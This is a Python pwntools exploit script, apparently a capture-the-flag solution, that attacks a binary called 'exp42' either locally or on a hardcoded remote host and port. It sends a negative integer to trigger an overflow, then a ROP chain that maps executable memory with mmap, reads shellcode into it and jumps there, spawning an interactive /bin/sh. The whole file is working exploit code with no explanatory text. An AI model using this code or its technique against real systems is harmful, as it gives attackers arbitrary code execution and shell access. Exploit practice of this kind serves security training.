#!/usr/bin/env python
# -*- coding: utf-8 -*-


from pwn import *
from struct import pack

context.update(arch='amd64')
BINARY_FILE = './exp42'
REMOTE = ('80.211.144.146', 34002) 

def setup_connection():
    binary, libc, preload = None, None, False
    local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
    task_libc = './libc.so.6'

    env = {}
    if args.PRELOAD:
        local_libc = task_libc
        env = {'LD_PRELOAD': task_libc}

    if args.BINARY:
        binary = ELF(BINARY_FILE)
        context.arch = binary.arch

    if args.REMOTE:
        if args.LIBC:
            libc = ELF(task_libc)
        s = remote(*REMOTE)
    else:
        if args.LIBC:
            libc = ELF(local_libc)
        
        s = process([BINARY_FILE, '-2147482648'], env=env)
        if args.GDB:
            context.terminal = ['gnome-terminal', '-e']
            breakpoints = [0x401c81]
            gdb.attach(s, exe=BINARY_FILE, gdbscript='\n'.join(['b *'+str(x) for x in breakpoints]))
            
    return s, binary, libc


if __name__ == '__main__':
    s, binary, libc = setup_connection()

    if REMOTE:
        s.sendline('-2147482648')
    
    # gadgets
    pop_rdi = 0x0000000000401716    # pop rdi; ret;
    pop_rsi = 0x0000000000406928    # pop rsi; ret;
    pop_rdx = 0x000000000043dc45    # pop rdx; ret;
    pop_r10 = 0x000000000043fc04    # pop r10; ret;
    pop_rax = 0x000000000043e5bc    # pop rax; ret;
    pop_rbx = 0x0000000000401e4b    # pop rbx; ret;
    xor_edx = 0x00000000004099e0    # xor edx, edx; mov rax, rdx; ret;
    add_edx_eax = 0x0000000000470012  # add edx, eax; mov rax, rdx; pop rbx; ret;
    mov_rcx_rdx = 0x0000000000410215  # mov rcx, rdx; add rax, rcx; mov qword ptr [rdi + 8], rax; xor eax, eax; ret;
    push_rcx = 0x00000000004628ad     # push rcx; ret;
    mov_esi_eax = 0x000000000046bd6d  # mov esi, eax; mov eax, dword ptr [rsi]; ret;
    syscall = 0x00000000004633c5      # syscall; ret;
    jmp_rsi = 0x000000000044babd      # jmp rsi;

    p = 'A'*0x98  # padding
    
    # mmap args
    # x86-64        rdi   rsi   rdx   r10   r8    r9
    # void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
    # prot -> PROT_EXEC | PROT_READ | PROT_WRITE = 0x7
    # flags -> MAP_ANONYMOUS | MAP_PRIVATE = 0x22
    # fd -> 0
    # offset -> 0
    p += p64(pop_rdi)
    p += p64(0xdeadbeef)
    p += p64(pop_rsi)
    p += p64(0x1000*4)
    p += p64(pop_rdx)
    p += p64(0x7)
    p += p64(pop_r10)
    p += p64(0x22)

    # mmap
    p += p64(pop_rax)
    p += p64(0x9)
    p += p64(syscall)

    # read shellcode
    # ssize_t read(int fd, void *buf, size_t count);
    # we should read it to mmaped region, addr of the region is in RAX
    p += p64(pop_rdi)
    p += p64(0)
    p += p64(mov_esi_eax)
    p += p64(pop_rdx)
    p += p64(0x1000)
    p += p64(pop_rax)
    p += p64(0)
    p += p64(syscall)

    # jmp to shellcode
    p += p64(jmp_rsi)

    assert '\n' not in p

    # s.recvuntil('Insert ROP chain here:\n')
    s.sendline(p)
    
    shellcode = asm(shellcraft.amd64.sh())
    s.sendline(shellcode)

    s.interactive()
    s.close()

